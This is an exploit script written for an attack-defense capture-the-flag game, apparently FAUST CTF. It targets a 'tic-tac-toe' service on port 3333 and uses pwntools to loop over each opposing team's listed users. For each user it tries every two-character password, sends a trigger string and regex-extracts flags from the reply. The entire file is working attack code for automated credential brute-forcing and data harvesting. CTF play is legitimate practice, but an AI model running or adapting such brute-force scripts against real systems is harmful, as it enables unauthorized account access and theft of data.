#!/usr/bin/env python3
import os
import sys
sys.path.insert(1, '../imports/')
sys.path.insert(1, 'imports/')

import utils
import requests
import json
from bs4 import BeautifulSoup
from pwn import *
import string
import re

# Use this function to print stuff to client
def log(message):
    print(message, flush=True)

IP_ADDRESS = sys.argv[1]
TEAM = IP_ADDRESS.split(":")[2] # IPv6
dir_path = os.path.dirname(os.path.realpath(__file__)) + '/../'
flag_ids = {}
with open(dir_path + 'flag_ids.json', 'r', encoding='utf-8') as f:
    flag_ids = json.loads(f.read())
    log(flag_ids)

# Adjust if needed
SERVICE = "tic-tac-toe"
PORT = 3333
# TARGET_URL = f'http://[{IP_ADDRESS}]:{PORT}'

valid_ips = flag_ids.get(SERVICE, {})
valid_users = valid_ips.get(TEAM, [])
if TEAM not in valid_ips:
    exit(0)
#print(valid_users)

from pwnlib.tubes.tube import tube
tube.s        = tube.send
tube.sa        = tube.sendafter
tube.sl        = tube.sendline
tube.sla    = tube.sendlineafter
tube.r        = tube.recv
tube.ru        = tube.recvuntil
tube.rl        = tube.recvline

alphabet = string.ascii_letters + string.digits

for username in valid_users:
    io = remote(IP_ADDRESS, PORT)
    
    for c1 in alphabet:
        for c2 in alphabet:
            pwd = (c1+c2).encode()
            io.sl(b"login")
            io.sl(username.encode())
            io.sl(pwd)
    
    io.sl(b"trollolo")
    io.sl(b"exit")
    resp = io.recvall()
    flags = re.findall(b"[A-Za-z0-9/+]{32}FAUST_", resp)
    for flag in flags:
        flag = "FAUST_" + flag.decode().replace("FAUST_", "")
        print(flag)

    io.close()

exit(0)